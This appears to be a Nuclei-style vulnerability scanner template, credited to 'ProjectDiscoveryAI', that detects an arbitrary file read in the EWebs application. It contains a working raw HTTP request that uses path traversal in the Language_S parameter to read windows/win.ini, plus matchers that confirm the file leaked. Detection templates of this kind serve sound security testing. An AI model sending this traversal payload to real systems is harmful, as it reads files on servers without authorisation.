id: n_soft-ewebs-readfile-CT-416457
info:
  name: EWebs ReadFile Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: |
    This template detects a file read vulnerability in EWebs application by exploiting the endpoint to read sensitive files.
http:
  - raw:
      - |
        POST /casmain.xgi HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        Language_S=../../../../windows/win.ini
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "for 16-bit app support"
        part: body
